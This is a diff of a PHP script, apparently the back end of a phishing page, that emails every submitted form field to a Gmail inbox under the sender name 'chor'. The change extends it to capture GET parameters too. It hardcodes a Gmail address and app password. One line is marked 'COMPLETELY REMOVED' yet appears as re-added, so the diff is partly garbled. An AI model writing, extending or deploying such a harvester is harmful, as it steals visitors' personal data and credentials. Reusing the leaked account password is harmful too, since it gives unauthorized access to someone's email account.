@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://fdfdfdcvxc.wasmer.app/");
+ header("Location: https://fdfdfdcvxc.wasmer.app/");   ← COMPLETELY REMOVED
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -18,36 +18,38 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
     }
 
-
+    // Also capture any GET parameters if you want (optional)
+    if (!empty($_GET)) {
+        $emailBody .= '<br><b>GET parameters:</b><br>';
+        foreach ($_GET as $key => $value) {
+            $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+        }
+    }
 
     // PHPMailer object creation
     $mail = new PHPMailer(true);
     try {
         // SMTP settings
         $mail->isSMTP();
-        $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
+        $mail->Host       = 'smtp.gmail.com';
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'gemnipro10@gmail.com'; // Replace with your email address
-        $mail->Password   = 'ixho qmiy utmm yqix'; // Replace with your email password
+        $mail->Username   = 'gemnipro10@gmail.com';
+        $mail->Password   = 'ixho qmiy utmm yqix';   // replace with your actual password or app password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
-
 
         // Email properties
         $mail->setFrom('gemnipro10@gmail.com', 'chor');
         $mail->addAddress('alibrohi883@gmail.com');
-       
-
-
-      // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'name';
-        $mail->Body = $emailBody; // Set the email body using the collected form data
+        $mail->Subject = 'New Submission - ' . date('Y-m-d H:i:s');
+        $mail->Body    = $emailBody;
 
         // Send email
         $mail->send();
+        // Success (optional: you can redirect after sending)
         echo 'Email successfully sent using PHPMailer.';
     } catch (Exception $e) {
         echo "Email sending failed. Error message: {$mail->ErrorInfo}";
